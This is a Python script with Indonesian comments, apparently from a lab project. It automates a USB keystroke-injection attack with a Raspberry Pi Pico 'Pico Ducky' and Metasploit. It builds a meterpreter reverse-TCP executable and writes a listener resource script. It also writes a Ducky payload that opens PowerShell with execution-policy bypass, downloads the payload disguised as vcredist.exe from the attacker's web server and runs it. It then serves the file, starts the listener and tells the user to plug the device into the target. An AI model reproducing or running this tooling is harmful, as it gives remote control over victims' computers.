import os
import subprocess
import time
import socket
import json

# --- KONFIGURASI ---
try:
    # Menentukan path secara dinamis berdasarkan lokasi skrip
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
except NameError:
    BASE_DIR = os.getcwd() # Fallback jika dijalankan secara interaktif

MSF_DIR = "/home/pblrks611/PROTO/metasploit"
PAYLOAD_NAME = "payload64.exe"
LPORT = 4444
WEB_PORT = 4465

# ==============================================================================
# FUNGSI UTILITAS UMUM
# ==============================================================================

def get_local_ip():
    """Mendapatkan alamat IP lokal dari mesin."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        print("[!] Gagal mendapatkan IP lokal. Pastikan terhubung ke jaringan.")
        return None

def find_pico_mount_point():
    """Menggunakan path Pico yang sudah di-hardcode dan memverifikasinya."""
    pico_path = "/media/pblrks611/CIRCUITPY"
    print(f"\n[*] Menggunakan path Pico yang sudah ditentukan: {pico_path}")
    
    # Verifikasi sederhana untuk memastikan path ada
    if os.path.isdir(pico_path):
        return pico_path
    else:
        print(f"[!] Error: Path '{pico_path}' tidak dapat ditemukan.")
        print("[!] Pastikan Pico sudah terhubung dan termuat dengan benar.")
        return None

def copy_payload_to_pico(work_dir, payload_filename="payload.dd"):
    """Menyalin payload spesifik ke Pico."""
    input("\nSilakan hubungkan Pico Ducky ke port USB. Tekan Enter jika sudah terhubung...")
    pico_path = find_pico_mount_point()
    if not pico_path or not os.path.isdir(pico_path):
        print("\n[!] Error: Path Pico tidak valid. Setup dibatalkan.")
        return False

    source_payload_path = os.path.join(work_dir, payload_filename)
    if not os.path.isfile(source_payload_path):
        print(f"[!] Error: File payload sumber '{source_payload_path}' tidak ditemukan.")
        return False

    destination_path = os.path.join(pico_path, "payload.dd")
    print(f"[*] Menyalin '{source_payload_path}' ke '{destination_path}'...")
    try:
        subprocess.run(['cp', source_payload_path, destination_path], check=True, stderr=subprocess.PIPE)
        print("[+] Payload berhasil disalin ke Pico.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Error saat menyalin payload: {e.stderr.decode()}")
        return False

# ==============================================================================
# FUNGSI UTAMA SERANGAN METASPLOIT
# ==============================================================================
def run_metasploit_attack():
    """Fungsi utama untuk mengorkestrasi seluruh serangan Metasploit."""
    print("\n===== Skenario Otomatis Metasploit Reverse TCP =====")
    if not os.path.exists(MSF_DIR):
        os.makedirs(MSF_DIR)
        
    lhost = get_local_ip()
    if not lhost:
        return

    print(f"[*] IP Lokal terdeteksi: {lhost}")
    print(f"[*] Payload akan dibuat untuk LHOST={lhost} dan LPORT={LPORT}")
    
    # 1. Generate Payload dengan Msfvenom
    print(f"\n[1/5] Membuat payload '{PAYLOAD_NAME}' dengan msfvenom...")
    payload_path = os.path.join(MSF_DIR, PAYLOAD_NAME)
    msfvenom_cmd = [
        'msfvenom', '-p', 'windows/x64/meterpreter/reverse_tcp',
        f'LHOST={lhost}', f'LPORT={LPORT}',
        '-f', 'exe', '-o', payload_path
    ]
    try:
        subprocess.run(msfvenom_cmd, check=True, capture_output=True)
        print(f"[+] Payload berhasil dibuat di: {payload_path}")
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"[!] Gagal membuat payload. Pastikan Metasploit terinstal dan ada di PATH.")
        print(f"   Error: {e}")
        return

    # 2. Buat Resource Script untuk Metasploit
    print("\n[2/5] Membuat skrip resource (handler.rc) untuk Metasploit...")
    rc_path = os.path.join(MSF_DIR, 'handler.rc')
    rc_content = f"""use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {LPORT}
run -j
"""
    with open(rc_path, 'w') as f:
        f.write(rc_content)
    print(f"[+] Skrip resource berhasil dibuat di: {rc_path}")
    
    # 3. Buat Ducky Script Payload
    print("\n[3/5] Membuat payload.dd untuk Pico Ducky...")
    ducky_path = os.path.join(MSF_DIR, 'payload.dd')
    ducky_content = f"""REM Metasploit Payload Injector - Bypass Method
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -NonI -ExecutionPolicy Bypass
ENTER
DELAY 1500
STRING iwr http://{lhost}:{WEB_PORT}/{PAYLOAD_NAME} -O $env:TEMP\\vcredist.exe; Start-Process $env:TEMP\\vcredist.exe
ENTER
DELAY 500
STRING exit
ENTER"""
    
    with open(ducky_path, 'w') as f:
        f.write(ducky_content)
    print(f"[+] Payload Ducky berhasil dibuat di: {ducky_path}")

    # 4. Salin Payload ke Pico Ducky
    print("\n[4/5] Mempersiapkan penyalinan ke Pico Ducky...")
    if not copy_payload_to_pico(MSF_DIR):
        return

    # 5. Jalankan Server dan Listener
    print("\n[5/5] Menjalankan listener Metasploit dan server web...")
    input("Pico Ducky siap. Tekan Enter untuk memulai listener dan server...")
    
    procs = []
    try:
        # Jalankan HTTP Server di background
        print(f"[*] Menjalankan server web di port {WEB_PORT} untuk direktori {MSF_DIR}")
        http_proc = subprocess.Popen(['python3', '-m', 'http.server', str(WEB_PORT), '--directory', MSF_DIR], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        procs.append(http_proc)

        # Jalankan Metasploit Console dengan resource script
        print("[*] Menjalankan msfconsole dengan handler.rc... (ini mungkin memakan waktu)")
        
        # Dapatkan nama pengguna asli yang menjalankan sudo
        original_user = os.environ.get('SUDO_USER')
        if not original_user:
            original_user = os.getlogin() # Fallback jika SUDO_USER tidak ditemukan

        # Jalankan terminal sebagai pengguna asli untuk menghindari error 'cannot open display'
        print("[*] Menjalankan msfconsole dengan handler.rc...")
        print("   msfconsole akan mengambil alih terminal ini.")
        print("   Untuk keluar, ketik 'exit' di dalam msfconsole.")
        # Menggunakan subprocess.run agar skrip menunggu msfconsole selesai
        subprocess.run(['msfconsole', '-r', rc_path])

        print("\n\n✅ Semua berjalan! Listener Metasploit aktif di terminal baru.")
        print("   Server web berjalan di latar belakang.")
        print("   Colokkan Pico Ducky ke target sekarang!")

        input("\nTekan Enter di sini untuk mematikan SEMUA proses setelah selesai...")

    finally:
        print("\n[*] Membersihkan dan mematikan semua proses...")
        for p in procs:
            try:
                p.kill()
            except:
                pass
        print("[+] Selesai.")
